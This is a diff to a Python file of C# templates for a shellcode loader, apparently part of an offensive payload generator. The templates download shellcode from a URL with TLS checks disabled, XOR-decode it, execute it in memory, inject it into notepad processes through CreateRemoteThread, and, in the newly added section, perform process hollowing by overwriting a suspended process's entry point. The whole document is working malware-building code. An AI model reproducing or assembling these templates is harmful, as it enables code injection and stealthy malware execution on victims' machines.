@@ -83,15 +83,15 @@ URL_DL_CODE = """
 
 	ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
 	System.Net.WebClient client = new System.Net.WebClient();
-	byte[] buf = client.DownloadData(url);
+	byte[] shellcode = client.DownloadData(url);
 
 """
 
 SC_XOR_DECODER = """
-  byte[] buf = new byte[] {{ {xor_shellcode} }};
-  for (int i = 0; i < buf.Length; i++)
+  byte[] shellcode = new byte[] {{ {xor_shellcode} }};
+  for (int i = 0; i < shellcode.Length; i++)
   {{
-    buf[i] = (byte)(((uint)buf[i] ^ {xor_key}) & 0xFF);
+    shellcode[i] = (byte)(((uint)shellcode[i] ^ {xor_key}) & 0xFF);
   }}
 """
 
@@ -121,8 +121,8 @@ START_SHELLCODE_IMPORT = """
         private static extern UInt32 WaitForSingleObject( IntPtr hHandle, UInt32 dwMilliseconds);
 """
 START_SHELLCODE = """
-            UInt32 funcAddr = VirtualAlloc(0, (UInt32)buf.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-            Marshal.Copy(buf, 0, (IntPtr)(funcAddr), buf.Length);
+            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
             IntPtr hThread = IntPtr.Zero;
             UInt32 threadId = 0;
             IntPtr pinfo = IntPtr.Zero;
@@ -141,19 +141,115 @@ START_PROCESS_INJECT = """
           int exitCode;
           // Run the external process & wait for it to finish
           using (Process proc = Process.Start(start))
-          {{
+          {
             Process[] expProc = Process.GetProcessesByName("notepad");
-            for (int i = 0; i < expProc.Length; i++) {{
+            for (int i = 0; i < expProc.Length; i++) {
               IntPtr hProcess = OpenProcess(0x001F0FFF, false, expProc[i].Id);
               IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
               IntPtr outSize;
-              WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
+              WriteProcessMemory(hProcess, addr, shellcode, shellcode.Length, out outSize);
               IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
-            }}
+            }
                proc.WaitForExit();
                // Retrieve the app's exit code
                exitCode = proc.ExitCode;
-          }}
+          }
+"""
+
+START_PROCESS_HOLLOW_IMPORT = """
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+        struct STARTUPINFO
+        {
+                public Int32 cb;
+                public string lpReserved;
+                public string lpDesktop;
+                public string lpTitle;
+                public Int32 dwX;
+                public Int32 dwY;
+                public Int32 dwXSize;
+                public Int32 dwYSize;
+                public Int32 dwXCountChars;
+                public Int32 dwYCountChars;
+                public Int32 dwFillAttribute;
+                public Int32 dwFlags;
+                public Int16 wShowWindow;
+                public Int16 cbReserved2;
+                public IntPtr lpReserved2;
+                public IntPtr hStdInput;
+                public IntPtr hStdOutput;
+                public IntPtr hStdError;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        internal struct PROCESS_INFORMATION
+        {
+                public IntPtr hProcess;
+                public IntPtr hThread;
+                public int dwProcessId;
+                public int dwThreadId;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        internal struct PROCESS_BASIC_INFORMATION
+        {
+                public IntPtr ExitStatus;
+                public IntPtr PebAddress;
+                public IntPtr AffinityMask;
+                public IntPtr BasePriority;
+                public IntPtr UniquePID;
+                public IntPtr InheritedFromUniqueProcessId;
+        }
+
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+        static extern bool CreateProcess( string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+
+        [DllImport("ntdll.dll", SetLastError = true)]
+        static extern UInt32 ZwQueryInformationProcess( IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, UInt32 ProcInfoLen, ref UInt32 retlen);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern bool ReadProcessMemory( IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
+
+        [DllImport("kernel32.dll")]
+        static extern bool WriteProcessMemory( IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern uint ResumeThread(IntPtr hThread);
+
+"""
+
+START_PROCESS_HOLLOW_CODE = """
+      STARTUPINFO si = new STARTUPINFO();
+
+      PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+
+      bool res = CreateProcess(null, System.Text.Encoding.Default.GetString(procname), IntPtr.Zero,
+              IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
+
+      PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
+      uint tmp = 0;
+      IntPtr hProcess = pi.hProcess;
+
+      ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
+      IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
+      byte[] addrBuf = new byte[IntPtr.Size];
+      IntPtr nRead = IntPtr.Zero;
+
+      ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
+
+      IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
+
+      byte[] data = new byte[0x200];
+      ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
+
+      uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3c);
+
+      uint opthdr = e_lfanew_offset + 0x28;
+
+      uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
+
+      IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
+      WriteProcessMemory(hProcess, addressOfEntryPoint, shellcode, shellcode.Length, out nRead);
+      ResumeThread(pi.hThread);
 """
 
 ### OTHER IMPORTS
